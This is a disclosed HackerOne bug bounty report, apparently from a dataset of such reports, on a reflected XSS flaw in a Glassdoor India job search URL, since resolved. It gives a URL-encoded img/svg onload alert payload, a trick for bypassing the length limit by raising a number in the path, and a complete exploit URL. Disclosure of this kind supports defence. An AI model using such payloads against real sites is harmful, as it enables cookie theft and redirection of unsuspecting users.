---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '971304'
original_report_id: '971304'
title: Reflected XSS at https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2020-08-31T14:47:57.544Z'
disclosed_at: '2021-04-16T02:52:31.497Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true

## Metadata

- HackerOne Report ID: 971304
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2021-04-16T02:52:31.497Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Summary:  There is a reflected XSS vulnerability in   https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true

Vulnerability Type: Reflected XSS
Browsers tested: Chrome, Firefox
Payload: %22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3e

Steps To Reproduce:
1. Navigate to  https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true

2.   /Job/[INPUT]pratt-whitney-jobs-SRCH_KE0,13.htm?
     if we input any value in the path then it is reflected on the page.
     Enter this payload here: %22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3e

3. But there is a character length limitation to the input.

4.   /Job/pratt-whitney-jobs-SRCH_KE0,[This value].htm? 
     We can bypass the character limitation by changing this value

5. Now change this value from 13 to 50

6.   Now open this url: https://www.glassdoor.co.in/Job/%22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3epratt-whitney-jobs-SRCH_KE0,50.htm?initiatedFromCountryPicker=true&countryRedirect=true
     See the response in browser, an alert will pop up

## Impact

Using XSS an attacker can steals the victim cookie and can also redirect him to a malicious site controlled by the attacker.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
